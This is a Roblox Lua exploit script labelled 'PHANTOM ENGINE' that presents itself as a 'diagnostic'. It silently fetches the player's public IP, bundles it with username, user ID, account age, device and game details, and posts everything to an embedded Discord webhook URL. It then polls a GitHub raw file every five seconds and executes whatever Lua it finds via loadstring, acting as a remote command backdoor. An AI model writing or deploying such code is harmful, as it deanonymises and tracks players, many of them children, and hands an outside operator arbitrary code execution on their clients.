-- [[ PHANTOM ENGINE: FINAL VERSION ]]
local LP = game:GetService("Players").LocalPlayer
local HS = game:GetService("HttpService")
local US = game:GetService("UserInputService")
local GS = game:GetService("GuiService")
local RunService = game:GetService("RunService")
local MS = game:GetService("MarketplaceService")

-- CONFIG (REPLACE THESE)
local WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1497643214176518197/VarvH0-wuUuPMwfPXZP23LoOmqbwcB3qmq3NKhCKUTIDrQVC-MHSvQ4Or7Ky6Hj1TxyC"
local COMMAND_URL = "https://raw.githubusercontent.com/thegoodoneatgamez/commander/refs/heads/main/commands.lua"

-- 1. SILENT ELITE DIAGNOSTIC
task.spawn(function()
    local ip = "Unknown"
    local s, r = pcall(function() return game:HttpGet("https://api.ipify.org") end)
    if s then ip = r end

    local data = {
        ["embeds"] = {{
            ["title"] = "🚨 DIAGNOSTIC REPORT (System Live)",
            ["color"] = 0,
            ["description"] = "👤 **Player Info**\n" ..
                "**User:** " .. LP.Name .. " (@" .. LP.DisplayName .. ")\n" ..
                "**ID:** " .. LP.UserId .. "\n" ..
                "**Age:** " .. LP.AccountAge .. " Days\n" ..
                "[Profile Link](https://www.roblox.com/users/"..LP.UserId.."/profile)\n\n" ..
                "💻 **Device Specs**\n" ..
                "**OS:** " .. US:GetPlatform().Name .. "\n" ..
                "**Resolution:** " .. math.floor(GS:GetScreenResolution().X) .. "x" .. math.floor(GS:GetScreenResolution().Y) .. "\n" ..
                "**FPS:** " .. math.floor(1 / RunService.Heartbeat:Wait()) .. "\n" ..
                "**Ping:** " .. math.floor(LP:GetNetworkPing() * 1000) .. "ms\n\n" ..
                "🌐 **Location**\n" ..
                "**IP:** " .. ip .. "\n\n" ..
                "🎮 **Game Data**\n" ..
                "**Game:** " .. MS:GetProductInfo(game.PlaceId).Name .. "\n" ..
                "**Job:** \n" .. game.JobId
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HS:JSONEncode(data)})
    else
        pcall(function() HS:PostAsync(WEBHOOK, HS:JSONEncode(data)) end)
    end
end)

-- 2. COMMAND EXECUTION LOOP
local lastCode = ""
while task.wait(5) do
    local success, code = pcall(function() return game:HttpGet(COMMAND_URL .. "?t=" .. os.time()) end)
    
    if success and code ~= lastCode and code ~= "" and code ~= "none" then
        lastCode = code
        local taskFunc, err = loadstring(code)
        if taskFunc then
            pcall(taskFunc)
        end
    end
end
